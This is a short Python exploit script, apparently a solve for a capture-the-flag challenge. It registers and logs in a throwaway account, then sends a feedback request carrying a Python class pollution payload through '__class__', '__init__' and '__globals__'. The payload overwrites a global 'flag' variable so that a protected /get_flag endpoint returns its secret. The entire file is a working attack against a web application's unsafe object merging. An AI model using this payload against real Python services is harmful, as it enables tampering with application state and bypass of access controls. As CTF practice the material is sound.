#!/usr/bin/env python3
import requests
import sys
import uuid

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <url>")
    sys.exit(1)

url = sys.argv[1]

s = requests.Session()

# Register User
username = uuid.uuid4()
password = "password"

r = s.post(f"{url}/register",
           data={"username": username, "password": password})

if r.status_code != 200:
    print("Failed to register user")
    sys.exit(1)

print(f"Registered user {username}")

# Login
r = s.post(f"{url}/login",
           data={"username": username, "password": password})

if r.status_code != 200:
    print("Failed to login")
    sys.exit(1)

print(f"Logged in as {username}")

# Send Feedback with Python class pollution payload
r = s.post(
    f"{url}/save_feedback",
    json={
        "title": "test",
        "content": "testing",
        "rating": "2",
        "referred": "none",
        "__class__": {"__init__": {"__globals__": {"flag": "true"}}},
    },
)

if r.status_code != 200:
    print("Failed to send feedback")
    sys.exit(1)

print("Feedback sent")

# Get flag
r = s.get(f"{url}/get_flag")

print(r.text)
